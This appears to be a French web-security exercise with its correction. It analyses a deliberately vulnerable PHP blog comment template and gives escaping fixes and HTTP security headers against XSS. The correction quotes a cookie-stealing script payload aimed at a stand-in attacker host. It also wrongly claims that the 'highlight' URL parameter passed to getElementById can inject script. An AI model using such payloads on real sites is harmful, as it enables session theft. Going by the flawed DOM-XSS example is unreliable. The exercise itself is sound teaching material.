## Exercice 4.2 : Sécurisation contre les attaques XSS (20 min)

### Rappel théorique
Le Cross-Site Scripting (XSS) est une vulnérabilité qui permet à un attaquant d'injecter un script côté client dans les pages web consultées par d'autres utilisateurs. Il existe trois types principaux de XSS :

- **XSS réfléchi** : le script malveillant provient de la requête HTTP actuelle
- **XSS stocké** : le script malveillant est stocké sur le serveur et est servi à tous les visiteurs
- **XSS basé sur le DOM** : le script malveillant est exécuté à la suite de modifications du DOM

Les conséquences peuvent être graves : vol de cookies de session, détournement de compte, hameçonnage, etc.

### Énoncé

Analysez le code suivant qui permet d'afficher les commentaires des utilisateurs sur un blog :

```html
<div class="comments-section">
    <h2>Commentaires</h2>
    
    <?php foreach ($comments as $comment): ?>
        <div class="comment">
            <h3><?= $comment['author'] ?></h3>
            <p><?= $comment['content'] ?></p>
            <small>Posté le <?= $comment['date'] ?> depuis <?= $comment['website'] ?></small>
        </div>
    <?php endforeach; ?>

    <form action="add_comment.php" method="post">
        <input type="text" name="author" placeholder="Votre nom">
        <input type="text" name="website" placeholder="Votre site web">
        <textarea name="content" placeholder="Votre commentaire"></textarea>
        <button type="submit">Envoyer</button>
    </form>
</div>

<script>
    // Mise en évidence du commentaire spécifié dans l'URL
    const highlightId = new URLSearchParams(window.location.search).get('highlight');
    if (highlightId) {
        document.getElementById(highlightId).classList.add('highlighted');
    }
</script>
```

1. Identifiez au moins trois vulnérabilités XSS dans ce code
2. Proposez les corrections nécessaires pour chaque vulnérabilité
3. Expliquez comment utiliser les en-têtes HTTP pour renforcer la protection contre les XSS

### Correction

#### 1. Vulnérabilités XSS identifiées

1. **Affichage non sécurisé des données utilisateur** : Les champs `$comment['author']`, `$comment['content']` et `$comment['website']` sont affichés directement sans échappement, permettant l'injection de balises HTML et de scripts.

   Exemple d'attaque : Un utilisateur pourrait entrer comme nom d'auteur :
   ```html
   <script>document.location='https://site-pirate.com/steal.php?cookie='+document.cookie</script>
   ```

2. **Manipulation non sécurisée du DOM** : Le paramètre `highlight` de l'URL est utilisé directement dans `document.getElementById()` sans aucune validation. Un attaquant pourrait injecter du code JavaScript via ce paramètre.

   Exemple d'attaque : `https://blog.com/post?highlight=');alert('XSS');//`

3. **Absence de validation des entrées dans le formulaire** : Les champs du formulaire n'ont aucune restriction et peuvent contenir n'importe quel contenu, y compris des scripts malveillants qui seront stockés puis affichés à tous les visiteurs.

4. **Absence d'attribut id sur les commentaires** : Le script tente d'accéder à un élément par ID, mais les commentaires n'ont pas d'attribut ID, ce qui peut conduire à des erreurs ou à des comportements inattendus.

#### 2. Corrections proposées

```html
<div class="comments-section">
    <h2>Commentaires</h2>
    
    <?php foreach ($comments as $comment): ?>
        <div class="comment" id="comment-<?= htmlspecialchars($comment['id'], ENT_QUOTES, 'UTF-8') ?>">
            <h3><?= htmlspecialchars($comment['author'], ENT_QUOTES, 'UTF-8') ?></h3>
            <p><?= htmlspecialchars($comment['content'], ENT_QUOTES, 'UTF-8') ?></p>
            <small>
                Posté le <?= htmlspecialchars($comment['date'], ENT_QUOTES, 'UTF-8') ?>
                <?php if (!empty($comment['website'])): ?>
                    depuis 
                    <a href="<?= htmlspecialchars($comment['website'], ENT_QUOTES, 'UTF-8') ?>" rel="nofollow">
                        <?= htmlspecialchars(parse_url($comment['website'], PHP_URL_HOST) ?: $comment['website'], ENT_QUOTES, 'UTF-8') ?>
                    </a>
                <?php endif; ?>
            </small>
        </div>
    <?php endforeach; ?>

    <form action="add_comment.php" method="post">
        <input type="text" name="author" placeholder="Votre nom" maxlength="50" required>
        <input type="url" name="website" placeholder="Votre site web (optionnel)" maxlength="100">
        <textarea name="content" placeholder="Votre commentaire" maxlength="1000" required></textarea>
        <button type="submit">Envoyer</button>
    </form>
</div>

<script>
    // Mise en évidence du commentaire spécifié dans l'URL
    const urlParams = new URLSearchParams(window.location.search);
    const highlightId = urlParams.get('highlight');
    
    if (highlightId && /^[0-9]+$/.test(highlightId)) {
        const element = document.getElementById('comment-' + highlightId);
        if (element) {
            element.classList.add('highlighted');
        }
    }
</script>
```

Corrections apportées :
1. Utilisation de `htmlspecialchars()` pour échapper toutes les données affichées, empêchant l'interprétation du HTML
2. Ajout d'IDs sécurisés aux commentaires, préfixés avec "comment-"
3. Validation et assainissement du paramètre `highlight` avec une expression régulière pour n'accepter que des nombres
4. Ajout de restrictions sur les champs du formulaire (`maxlength`, `required`, type `url`)
5. Traitement spécial des URLs de sites web pour afficher uniquement le nom d'hôte
6. Ajout de l'attribut `rel="nofollow"` pour les liens externes

#### 3. Utilisation des en-têtes HTTP pour la protection XSS

Pour renforcer la protection contre les XSS, plusieurs en-têtes HTTP peuvent être utilisés :

1. **Content-Security-Policy (CSP)** :
   ```
   Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self'; frame-ancestors 'none';
   ```
   Cet en-tête restreint les sources de contenu que le navigateur peut charger, limitant considérablement l'impact des attaques XSS. Dans cet exemple, seules les ressources provenant du même domaine sont autorisées.

2. **X-XSS-Protection** :
   ```
   X-XSS-Protection: 1; mode=block
   ```
   Cet en-tête active la protection XSS intégrée des navigateurs, bloquant le chargement de la page en cas de détection d'une attaque XSS.

3. **X-Content-Type-Options** :
   ```
   X-Content-Type-Options: nosniff
   ```
   Cet en-tête empêche le navigateur de deviner le type MIME des ressources, réduisant le risque d'exécution de scripts malveillants déguisés en d'autres types de contenu.

4. **Strict-Transport-Security (HSTS)** :
   ```
   Strict-Transport-Security: max-age=31536000; includeSubDomains
   ```
   Cet en-tête force les connexions HTTPS, protégeant contre les attaques d'interception qui pourraient être utilisées pour injecter du code malveillant.

5. **Set-Cookie avec attributs sécurisés** :
   ```
   Set-Cookie: session=123; HttpOnly; Secure; SameSite=Strict
   ```
   Ces attributs protègent les cookies contre le vol via XSS (HttpOnly), les transmissions non sécurisées (Secure) et les attaques CSRF (SameSite).

Ces en-têtes peuvent être définis dans la configuration du serveur web (Apache, Nginx) ou dans le code PHP :

```php
// En PHP
header("Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self'; frame-ancestors 'none';");
header("X-XSS-Protection: 1; mode=block");
header("X-Content-Type-Options: nosniff");
```